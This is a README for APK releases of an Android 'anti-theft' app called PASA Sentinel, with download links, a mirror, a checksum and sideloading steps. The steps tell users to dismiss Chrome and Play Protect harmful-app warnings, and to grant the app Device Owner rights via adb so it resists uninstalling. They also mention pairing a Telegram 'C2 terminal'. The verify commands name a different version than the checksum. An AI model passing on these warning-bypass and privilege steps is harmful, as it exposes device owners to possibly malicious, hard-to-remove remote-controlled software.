# 📦 PASA Sentinel APK Releases

This directory hosts verified release binaries of **PASA Sentinel (Physical Anti-Theft Security Agent)**.

---

## 📥 Direct Downloads

| File | Release | Build | Size | Direct Link |
|---|---|---|---|---|
| **`PASA-Sentinel-v3.0.9.apk`** | `v3.0.9` (Latest Stable) | Build 15 | 18.11 MB | [Download APK](https://github.com/rbr48/pasa/raw/main/releases/PASA-Sentinel-v3.0.9.apk) |
| **`pasa-latest.apk`** | Rolling Latest | Build 15 | 18.11 MB | [Download Latest](https://github.com/rbr48/pasa/raw/main/releases/pasa-latest.apk) |
| **`PASA-Sentinel-v3.0.8.apk`** | `v3.0.8` (Archive) | Build 14 | 18.10 MB | [Download v3.0.8](https://github.com/rbr48/pasa/raw/main/releases/PASA-Sentinel-v3.0.8.apk) |
| **`PASA-Sentinel-v3.0.7.apk`** | `v3.0.7` (Archive) | Build 13 | 18.10 MB | [Download v3.0.7](https://github.com/rbr48/pasa/raw/main/releases/PASA-Sentinel-v3.0.7.apk) |
| **`PASA-Sentinel-v3.0.6.apk`** | `v3.0.6` (Archive) | Build 12 | 18.10 MB | [Download v3.0.6](https://github.com/rbr48/pasa/raw/main/releases/PASA-Sentinel-v3.0.6.apk) |

Alternative Mirror (Fast CDN): [https://pasa.izhaanintellect.fun/api/app/download/pasa-latest.apk](https://pasa.izhaanintellect.fun/api/app/download/pasa-latest.apk)

---

## 🔐 Cryptographic Integrity (v3.0.9)

Always verify the SHA-256 checksum before sideloading onto your phone:

* **File:** `PASA-Sentinel-v3.0.9.apk`
* **File Size:** `18,984,374 bytes` (18.11 MB)
* **SHA-256 Checksum:**
  ```text
  5ae20482f2a9778b59c2a271c47a487a930f645c84779971c218658437d733a5
  ```

### Verify Checksum:
- **Windows (PowerShell):**
  ```powershell
  Get-FileHash PASA-Sentinel-v3.0.8.apk -Algorithm SHA256
  ```
- **Linux / macOS:**
  ```bash
  sha256sum PASA-Sentinel-v3.0.8.apk
  ```

---

## 🚀 Quick Sideload & Installation

1. Transfer or download the APK to your Android device (Android 8.0 through Android 16).
2. If Chrome displays *"File might be harmful"*, tap **Download anyway** (standard for off-market sovereign packages).
3. If Google Play Protect shows a warning, tap **More details** → **Install anyway**.
4. To unlock Knox-grade Device Owner defense (anti-uninstall & lockscreen shade protection), connect via USB and execute:
   ```bash
   adb shell dpm set-device-owner com.izhaanintellect.pasa/.admin.PasaDeviceAdmin
   ```
5. Follow the [Complete Telegram Bot Setup Guide](../README.md#complete-telegram-bot-setup-guide) in the main README to pair your C2 terminal!
